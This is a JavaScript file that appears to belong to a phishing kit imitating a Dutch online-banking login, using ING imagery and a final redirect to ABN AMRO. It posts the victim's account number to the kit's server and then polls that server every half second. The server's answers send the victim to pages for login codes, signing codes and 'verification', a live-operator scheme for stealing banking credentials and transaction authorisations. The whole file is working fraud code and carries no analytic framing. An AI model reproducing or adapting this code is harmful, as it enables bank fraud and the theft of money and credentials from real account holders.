const login_form = document.querySelector('#login-form');

const identification = document.querySelector('#rekeningnummer');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (identification.value == '') {
        loginButton.innerHTML = 'Volgende';
        loginButton.disabled = false;
        identification.disabled = false;
        
        identification.value = '';
        
        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('identification', identification.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
        loginButton.disabled = true;
        identification.disabled = true;
        
        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/portalserver/nl/prive/bankieren/identificatie/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/portalserver/nl/prive/bankieren/identificatie/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            window.location.href = '/portalserver/nl/prive/bankieren/inloggen/' + token.value;
                        } else if (data.page == 'identification') {
                            loginButton.innerHTML = 'Volgende';
                            loginButton.disabled = false;
                            identification.disabled = false;
                            
                            identification.value = '';
                            
                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/logincode/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/signeercode/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/portalserver/nl/prive/bankieren/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.abnamro.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


